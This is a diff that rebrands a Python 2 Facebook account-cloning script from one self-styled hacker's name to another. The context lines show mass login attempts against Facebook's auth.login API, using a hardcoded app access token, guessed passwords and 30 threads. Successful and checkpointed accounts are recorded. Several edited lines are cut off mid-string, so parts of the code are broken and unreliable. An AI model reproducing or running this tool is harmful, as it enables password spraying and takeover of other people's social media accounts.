@@ -48,7 +48,7 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.07)
 
-#Dev:love_hacker
+#Dev:Taimur_hacker
 ##### LOGO #####
 logo = """
        \033[1;91m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:
@@ -59,11 +59,11 @@ logo = """
   \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
   \033[1;91m:》》》\033[1;93m+NE-DENA\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
 \033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-Raza-\033[1;95m♡╭──────────•◈•──────────╮♡
-\033[1;92m..........................RazaCreation......................
+\033[1;92m..........................TAIMUR KHAN......................
 \033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
-\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Raza
+\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   TAIMUR
 \033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRaza\033[1;95m♡╰──────────•◈•──────────╯♡"""
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mTaimur\033[1;95m♡╰──────────•◈•──────────╯♡"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -89,14 +89,14 @@ print  """
  \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈
  \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
   \033[1;96m ─────────────•◈•──────────  
-   \033[1;92m███████▒▒Welcome To Raza CREATIONS▒▒████████
-\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mRaza\033[1;95m♡╭──────────•◈•──────────╮♡
+   \033[1;92m███████▒▒Welcome To TAIMUR KHAN▒▒████████
+\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mtaimur\033[1;95m♡╭──────────•◈•──────────╮♡
 \033[1;94mAuthor\033[1;91m: \033[1;91mAcreations
-\033[1;94mRaza\033[1;91m: \033[1;91▒▓██████████████]99.9
+\033[1;94mTaimur\033[1;91m: \033[1;91▒▓██████████████]99.9
 \033[1;94mFacebook\033[1;91m: \033[1;91mAcreations
 \033[1;94mWhatsapp\033[1;91m: \033[1;91m NE-DENA
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRaza\033[1;95m♡╰──────────•◈•──────────╯♡"""
-jalan('              \033[1;96m....................Raza.....................:')
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mTaimur\033[1;95m♡╰──────────•◈•──────────╯♡"""
+jalan('              \033[1;96m....................TAIMUR.....................:')
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
 jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
 jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
@@ -104,8 +104,8 @@ jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
 print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin Raza\033[1;95m♡╰──────────•◈•──────────╯♡"
 
-CorrectUsername = "Raza"
-CorrectPassword = "Raza"
+CorrectUsername = "taimur"
+CorrectPassword = "khan"
 
 loop = 'true'
 while (loop == 'true'):
@@ -121,7 +121,7 @@ while (loop == 'true'):
             os.system('xdg-open https://www.youtube.com/channel/UC9je9oH-o4qUsp7NkXn16yQ')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UC9je9oH-o4qUsp7NkXn16yQ')
+        os.system('xdg-open 
 
 def login():
 	os.system('clear')
@@ -140,7 +140,7 @@ def login():
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
 		tik()
 		try:
-			br.open('https://m.facebook.com')
+			br.open('https://')
 		except mechanize.URLError:
 			print"\n\x1b[1;96mThere is no internet connection"
 			keluar()
@@ -295,9 +295,9 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRL+Z♡\033[1;94m----»"
-	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96mRaza\033[1;95m♡─────────•◈•─────────♡"
+	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96mtaimur\033[1;95m♡─────────•◈•─────────♡"
 	jalan(' \033[1;93m ........Cloning Start plzzz Wait.......... ')
-	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96mRaza\033[1;95m♡─────────•◈•─────────♡"
+	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96mtaimur\033[1;95m♡─────────•◈•─────────♡"
 	
 			
 	def main(arg):
@@ -324,7 +324,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = 'Pakistan'
+					pass2 = 'Taimur'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
@@ -416,8 +416,8 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRaza\033[1;95m♡──────────•◈•──────────♡"
-	print "  \033[1;93m«---•◈•---Developed By Raza---•◈•---»" #Dev: Hacker_Raza
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mtaimur\033[1;95m♡──────────•◈•──────────♡"
+	print "  \033[1;93m«---•◈•---Developed By TAIMUR KHAN---•◈•---»" #Dev: Hacker_TAIMUR
 	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
 	print """
@@ -427,7 +427,7 @@ def pilih_super():
              [███████████████]
              ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
 ♡──────────────•◈•──────────────♡.
-: \033[1;96m .....Raza  Creations........... \033[1;93m :
+: \033[1;96m ..... TAIMUR KHAN........... \033[1;93m :
 ♡──────────────•◈•──────────────♡.' 
                 whatsapp Num
                +NI DENA """
